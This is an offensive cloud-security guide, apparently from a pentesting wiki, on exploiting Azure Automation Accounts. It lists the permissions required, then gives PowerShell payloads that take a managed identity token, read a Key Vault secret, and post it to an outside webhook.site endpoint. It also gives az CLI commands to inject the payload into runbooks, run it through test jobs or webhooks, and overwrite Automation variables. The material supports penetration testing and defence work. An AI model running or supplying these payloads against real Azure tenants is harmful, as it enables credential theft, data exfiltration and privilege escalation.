---
title: "Azure Automation Accounts Explotation"
order: 162
description: Explotation of Automation Accounts
---

## Create/Modify/Run Runbooks

> The following permisssions are needed:
> - **Microsoft.Automation/automationAccounts/jobs/write**
> - **Microsoft.Automation/automationAccounts/runbooks/draft/write**
> - **Microsoft.Automation/automationAccounts/jobs/output/read**
> - **Microsoft.Automation/automationAccounts/runbooks/publish/action**
> - **Microsoft.Resources/subscriptions/resourcegroups/read**
> - **Microsoft.Automation/automationAccounts/runbooks/write**
>
> As summary these permissions allow to create, modify and run Runbooks in the Automation Account which you could use to execute code in the context of the Automation Account and escalate privileges to the assigned Managed Identities and leak credentials and encrypted variables stored in the Automation Account.

Create a payload to steal the MI

```bash
# payload.ps1
$identityEndpoint = $env:IDENTITY_ENDPOINT
$identityHeader   = $env:IDENTITY_HEADER

$tokenResponse = Invoke-RestMethod `
    -Uri "http://$identityEndpoint/metadata/identity/oauth2/token?api-version=2019-08-01&resource=https://vault.azure.net" `
    -Headers @{"Secret" = $identityHeader} `
    -Method Get

$token = $tokenResponse.access_token

$secretResponse = Invoke-RestMethod `
    -Uri "https://<vault-name>.vault.azure.net/secrets/<secret-name>/?api-version=7.4" `
    -Headers @{"Authorization" = "Bearer $token"} `
    -Method Get

$body = @{ secret = $secretResponse.value } | ConvertTo-Json
Invoke-RestMethod `
    -Uri "https://webhook.site/<your-uuid>" `
    -Method Post -Body $body -ContentType "application/json"
```

Then inject the payload

```bash
az automation runbook replace-content --no-wait \
  --resource-group <RG> \
  --automation-account-name <account> \
  --name <runbook-name> \
  --content @payload.ps1
```

And start a test job

```bash
az rest --method PUT \
  --url "https://management.azure.com/subscriptions/$SUBSCRIPTION_ID/resourceGroups/<RG>/providers/Microsoft.Automation/automationAccounts/<account>/runbooks/<runbook>/draft/testJob?api-version=2023-05-15-preview" \
  --headers "Content-Type=application/json" \
  --body '{
    "parameters": {},
    "runOn": "",
    "runtimeEnvironment": "PowerShell-5.1"
  }'
```

## Webhooks

```powershell
# payload.ps1
$tokenResponse = Invoke-RestMethod `
    -Uri "http://169.254.169.254/metadata/identity/oauth2/token?api-version=2021-12-13&resource=https://vault.azure.net" `
    -Headers @{"Metadata" = "true"} `
    -Method Get

$token = $tokenResponse.access_token

$secretResponse = Invoke-RestMethod `
    -Uri "https://<vault-name>.vault.azure.net/secrets/<secret-name>/?api-version=7.4" `
    -Headers @{"Authorization" = "Bearer $token"} `
    -Method Get

$body = @{ secret = $secretResponse.value } | ConvertTo-Json
Invoke-RestMethod `
    -Uri "https://webhook.site/<your-uuid>" `
    -Method Post -Body $body -ContentType "application/json"
```

```bash
# Step 1: Upload and publish (webhooks require published version)
az automation runbook replace-content --no-wait \
  --resource-group <RG> --automation-account-name <account> \
  --name <runbook> --content @payload.ps1

az automation runbook publish \
  --resource-group <RG> --automation-account-name <account> \
  --name <runbook> 

# Step 2: Create webhook pointing to hybrid worker group
# The webhook URI is ONLY returned on creation — save it immediately
az rest --method put \
  --url "https://management.azure.com/subscriptions/$SUBSCRIPTION_ID/resourceGroups/<RG>/providers/Microsoft.Automation/automationAccounts/<account>/webhooks/<webhook-name>?api-version=2015-10-31" \
  --body '{
    "name": "<webhook-name>",
    "properties": {
      "isEnabled": true,
      "expiryTime": "2027-12-31T23:59:59+00:00",
      "runOn": "<hybrid-worker-group-name>",
      "runbook": { "name": "<runbook-name>" }
    }
  }'
# Save the returned "uri" field immediately — it will not be shown again

WEBHOOK_URI='https://...'

# Step 3: Fire the webhook
# ⚠️ Use single quotes in zsh — zsh escapes ? in URLs
curl -s -X POST "$WEBHOOK_URI" \
  -H "Content-Type: application/json" \
  --data-raw '{}'
```

## Modify variables

> The permission needed is:
> - **Microsoft.Automation/automationAccounts/variables/write**
>
> With the permission Microsoft.Automation/automationAccounts/variables/write it’s possible to write variables in the Automation Account using the following command.

```bash
az rest --method PUT \
--url "https://management.azure.com/subscriptions/<subscription-id>/resourceGroups/<res-group>/providers/Microsoft.Automation/automationAccounts/<automation-account-name>/variables/<variable-name>?api-version=2019-06-01" \
--headers "Content-Type=application/json" \
--body '{
    "name": "<variable-name>",
    "properties": {
        "description": "",
        "value": "\"<variable-value>\"",
        "isEncrypted": false
    }
}
```

Or with a file

```bash
az rest --method PUT \
  --url "https://management.azure.com/subscriptions/<subscription-id>/resourceGroups/<res-group>/providers/Microsoft.Automation/automationAccounts/<automation-account-name>/variables/<variable-name>?api-version=2019-06-01" \
  --headers "Content-Type=application/json" \
  --body @body.json
```